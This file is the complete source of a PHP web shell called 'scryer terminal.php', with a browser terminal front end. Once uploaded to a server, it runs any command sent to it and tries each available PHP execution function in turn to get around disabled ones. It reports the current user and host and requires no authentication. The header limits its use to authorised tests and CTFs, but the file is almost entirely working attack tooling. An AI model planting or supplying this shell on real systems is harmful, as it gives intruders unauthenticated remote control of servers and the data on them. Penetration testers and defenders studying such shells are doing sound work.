<?php
/**
 * scryer terminal.php — a self-contained PHP web terminal.
 *
 * Drop this on a target you are AUTHORISED to test, browse to it
 * (http://target/terminal.php) and you get an interactive terminal in the
 * page: it tracks the working directory, handles `cd`, and runs everything
 * else through whichever exec primitive PHP leaves enabled.
 *
 * Authorised engagements / CTF / your own labs only.
 */

// ---- command execution -----------------------------------------------------
function sh_exec($cmd) {
    // Try each primitive; return output from the first that works.
    if (function_exists('proc_open')) {
        $d = [1 => ['pipe','w'], 2 => ['pipe','w']];
        $p = @proc_open($cmd, $d, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            foreach ($pipes as $pipe) @fclose($pipe);
            @proc_close($p);
            return $out;
        }
    }
    if (function_exists('shell_exec')) return (string)@shell_exec($cmd . ' 2>&1');
    if (function_exists('exec'))       { @exec($cmd . ' 2>&1', $o); return implode("\n", $o); }
    if (function_exists('system'))     { ob_start(); @system($cmd . ' 2>&1'); return ob_get_clean(); }
    if (function_exists('passthru'))   { ob_start(); @passthru($cmd . ' 2>&1'); return ob_get_clean(); }
    if (function_exists('popen'))      {
        $h = @popen($cmd . ' 2>&1', 'r'); $o = '';
        if ($h) { while (!feof($h)) $o .= fread($h, 4096); pclose($h); }
        return $o;
    }
    return "[scryer] no exec function available (all disabled by php.ini)";
}

// ---- request handler (JSON) ------------------------------------------------
if (isset($_POST['cmd'])) {
    header('Content-Type: application/json');
    $cwd = isset($_POST['cwd']) && $_POST['cwd'] !== '' ? $_POST['cwd'] : getcwd();
    @chdir($cwd);
    $cmd = trim($_POST['cmd']);
    $out = '';

    if ($cmd === 'clear') {
        // handled client-side; nothing to do
    } elseif (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
        $dir = trim($m[1]) === '' ? getenv('HOME') ?: '/' : trim($m[1]);
        if (@chdir($dir)) { /* ok */ } else { $out = "cd: cannot change to '$dir'"; }
    } elseif ($cmd !== '') {
        $out = sh_exec($cmd);
    }

    $cwd  = getcwd();
    $user = function_exists('posix_getpwuid') && function_exists('posix_geteuid')
            ? @posix_getpwuid(posix_geteuid())['name'] : trim(sh_exec('whoami'));
    $host = function_exists('gethostname') ? gethostname() : trim(sh_exec('hostname'));
    echo json_encode([
        'output' => $out,
        'cwd'    => $cwd,
        'prompt' => ($user ?: '?') . '@' . ($host ?: '?') . ':' . $cwd . '$ ',
    ]);
    exit;
}
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>terminal</title>
<style>
  html,body{margin:0;height:100%;background:#0b0e14;color:#c7d0e0;
    font:14px/1.45 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
  #screen{padding:12px;height:calc(100vh - 44px);overflow-y:auto;white-space:pre-wrap;
    word-break:break-word}
  .cmd{color:#7ee787}.err{color:#ff7b72}.p{color:#58a6ff}
  #bar{display:flex;align-items:center;position:sticky;bottom:0;
    background:#0b0e14;border-top:1px solid #1c2230;padding:8px 12px}
  #prompt{color:#58a6ff;margin-right:6px;white-space:pre}
  #in{flex:1;background:transparent;border:0;color:#c7d0e0;font:inherit;outline:none}
</style>
</head>
<body>
<div id="screen"></div>
<div id="bar"><span id="prompt">$ </span><input id="in" autofocus autocomplete="off" spellcheck="false"></div>
<script>
const screen=document.getElementById('screen'),input=document.getElementById('in'),
      promptEl=document.getElementById('prompt');
let cwd='',prompt='$ ',hist=[],hi=0;
function esc(s){return s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
function println(html){screen.innerHTML+=html+'\n';screen.scrollTop=screen.scrollHeight;}
async function run(cmd){
  if(cmd==='clear'){screen.innerHTML='';return;}
  println('<span class="p">'+esc(prompt)+'</span><span class="cmd">'+esc(cmd)+'</span>');
  const body=new URLSearchParams({cmd,cwd});
  try{
    const r=await fetch(location.href,{method:'POST',headers:
      {'Content-Type':'application/x-www-form-urlencoded'},body});
    const j=await r.json();
    cwd=j.cwd;prompt=j.prompt;promptEl.textContent=prompt;
    if(j.output)println(esc(j.output.replace(/\n$/,'')));
  }catch(e){println('<span class="err">[request failed] '+esc(''+e)+'</span>');}
}
input.addEventListener('keydown',e=>{
  if(e.key==='Enter'){const c=input.value;input.value='';if(c.trim()){hist.push(c);hi=hist.length;}run(c);}
  else if(e.key==='ArrowUp'){if(hi>0){hi--;input.value=hist[hi]||'';}e.preventDefault();}
  else if(e.key==='ArrowDown'){if(hi<hist.length){hi++;input.value=hist[hi]||'';}e.preventDefault();}
});
document.addEventListener('click',()=>input.focus());
run('id');   // greet with id + set the prompt
</script>
</body>
</html>
